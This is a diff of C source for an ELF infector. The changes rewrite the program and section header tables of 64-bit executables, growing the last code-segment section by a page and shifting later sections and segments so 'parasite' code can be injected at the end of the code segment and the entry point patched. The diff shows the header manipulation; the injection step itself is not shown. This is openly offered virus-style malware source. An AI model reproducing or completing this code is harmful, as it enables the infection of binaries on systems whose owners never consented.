@@ -81,8 +81,11 @@ uint64_t	sht_size,				// Size of SHT = no. of entries * size of 1 entry
 
 Elf64_Off   end_offset_of_elf;  	// Offset to end of elf (equivalent to size of file on disk)
 
-uint64_t 	ehframe_section_size;		// Size of .eh_frame section in file
-Elf64_Off	ehframe_section_offset;		// File offset of .eh_frame section
+Elf64_Off	code_segment_end_offset;// Save original end offset to be used in ModifySHT() to find
+									// last section of code segment
+
+char *		last_section_of_code_segment_name;
+Elf64_Off	parasite_offset;		// store the offset in file where the parasite will be injected
 
 
 
@@ -122,22 +125,13 @@ void ElfParser(char *filepath)
 
 
 	// -x-x-x-x-x-x-x-x-x-	STORE ORIGINAL INFORMATION before modifying ELF -x-x-x-x-x-x-x-x-x- 
+	
 		int ret;
 		ret = ParseElfHeader( map_address );
 			// skip Relocatable/Core type file
 			// skip 32bit ELFCLASS binaries
 			if (ret == 0x2 || ret == 0x3)	return;					
-
-
-		// Load the offset and size of .eh_frame section (i.e. last section of code segment) 
-		// (on disk representation) in the variables 'ehframe_section_offset' and 
-		// 'ehframe_section_size' passed by reference to the function ParseSHT()
-		ParseSHT( map_address, ".eh_frame", &ehframe_section_offset, &ehframe_section_size );
-
-
-		printf("[DEBUG] .eh_frame section found @ offset : 0x%lx, size : 0x%lx\n", ehframe_section_offset, ehframe_section_size);
-
-
+	
 	// -x-x-x-x-x-x-x-x-x--x-x-x-x-x-x-x-x-x--x-x-x-x-x-x-x-x-x--x-x-x-x-x-x-x-x-x--x-x-x-x-x-
 
 
@@ -147,6 +141,7 @@ void ElfParser(char *filepath)
 
 
 	// Write mapped memory to file on disk
+	//
 
 
 	printf("Unmapping %s!\n", filepath);
@@ -192,15 +187,12 @@ int ParseElfHeader(void *map_addr)
 
 
 
-// Function parses the SHT of the ELF binary mapped in memory @ 'map_addr' and finds the section name
-// as described by string 'section' and sets the 'section_offset' and 'section_size' (by the section's
-// offset and size as described by the ELF's SHT). These variables ('section_offset' and 
-// 'section_size' is provided to the function by references (rather than by values).
-void ParseSHT(void *map_addr, char *section, Elf64_Off *section_offset, uint64_t *section_size)
+// Modify SHT table appropriately to fit in parasite code
+void ModifySHT(void *map_addr)
 {
-	
 	end_offset_of_elf = (sht_offset + sht_size);
-	
+	Elf64_Off current_section_end_offset;
+
 
 	// Point shdr (Pointer to iterate over SHT) to the last entry of SHT
 	Elf64_Shdr *section_entry = (Elf64_Shdr *) (map_addr +
@@ -209,7 +201,6 @@ void ParseSHT(void *map_addr, char *section, Elf64_Off *section_offset, uint64_t
 	
 	// .shstrtab section stores all section names (NULL terminated ASCII strings, back-to-back)
 	char *shstrtab_section;
-
 
 
 	// Parse the SHT bottom->up ( i.e. from last entry(.shstrtab) upto 2nd entry (after NULL entry)) 
@@ -229,25 +220,42 @@ void ParseSHT(void *map_addr, char *section, Elf64_Off *section_offset, uint64_t
 			// section_entry->offset tells at what offset is the current section is present in binary
 			shstrtab_section = (char *)(map_addr + section_entry->sh_offset);
 		}
-		
-		
+	
+
+		// Find the last section of the CODE segment				
 		else {
-			
+	
 			char *current_section_name = (char *) (shstrtab_section + section_name_offset);
-
-
-			// While infecting sections, loop the entries from top->bottom and add this if statement
-			// to increase the offset of the sections after .text
-            //if (SECTION_FOUND == 1) printf("Fuck %s section\n", current_section_name);
-
 			
-			if ( strncmp(section, current_section_name, strlen(section) + 1) == 0 ) {
 
+			current_section_end_offset = section_entry->sh_offset + section_entry->sh_size;
+			if ( code_segment_end_offset == current_section_end_offset) {
+			
+				// This is the last section of CODE Segment
 				SECTION_FOUND 	= 1;
-				*section_offset	= section_entry->sh_offset;
-				*section_size	= section_entry->sh_size; 
+				last_section_of_code_segment_name = current_section_name;
+
+
+				// Increase the sizeof this section by a PAGE_SIZE to accomodate our lovely parasite
+				section_entry->sh_size = section_entry->sh_size + PAGE_SIZE;
+			
+				
+				// We'll write parasite code to the end of this section (end of CODE Segment) 
+				parasite_offset = current_section_end_offset;
 			}
 		}	
+
+
+        // For all the sections after the 'last section of CODE Segment'
+        if (SECTION_FOUND == 0)
+        {
+            char *current_section_name = (char *) (shstrtab_section + section_name_offset);
+
+            // Increase the section address and offset by page size
+            section_entry->sh_offset = section_entry->sh_offset + PAGE_SIZE;
+            section_entry->sh_addr   = section_entry->sh_addr   + PAGE_SIZE;
+
+        }
 
 		
 		// Move to the next section entry
@@ -258,7 +266,7 @@ void ParseSHT(void *map_addr, char *section, Elf64_Off *section_offset, uint64_t
 
 
 // Find CODE Segment and modify fields according to the algorithm
-void ParsePHT(void *map_addr)
+void ModifyPHT(void *map_addr)
 {
 	// Point to first entry in PHT
 	Elf64_Phdr *phdr_entry = (Elf64_Phdr *)(map_addr + pht_offset);
@@ -272,8 +280,7 @@ void ParsePHT(void *map_addr)
 	
 		// For all segments after CODE Segment  
         if (CODE_SEGMENT_FOUND == 1)
-        {           
-			
+        {
 			// Increase p_offset, p_vaddr, p_addr
             phdr_entry->p_offset = phdr_entry->p_offset + PAGE_SIZE;
             phdr_entry->p_vaddr  = phdr_entry->p_vaddr  + PAGE_SIZE;
@@ -288,7 +295,9 @@ void ParsePHT(void *map_addr)
 		{
 
 			CODE_SEGMENT_FOUND = 1;
-
+			
+			// Calculate the offset where the code segment ends (to be used later to find last section			  // of CODE Segment in ModifySHT() ) and save it globally.
+			code_segment_end_offset = phdr_entry->p_offset + phdr_entry->p_filesz;
 
 			// Save (p_offset + p_filesz) value for step - 4 of algorithm 
             parasite_injection_offset = phdr_entry->p_offset + phdr_entry->p_filesz;
@@ -316,12 +325,12 @@ static void ModifyMappedMemory(void *map_addr)
 	elf_header->e_shoff = elf_header->e_shoff + PAGE_SIZE;
 
 	
-	// STEP - 2
-	ParsePHT(map_addr); 
+	// STEP - 2	 : Manipulate PHT
+	ModifyPHT(map_addr); 
 
 
-	// STEP - 3  : Incomplete
-	//ParseSHT();
+	// STEP - 3  : Manipulate SHT
+	ModifySHT(map_addr);
 
 
 	// STEP - 4  : Inject Parasite code and patch ELF entry point with 'parasite_injection_offset' 
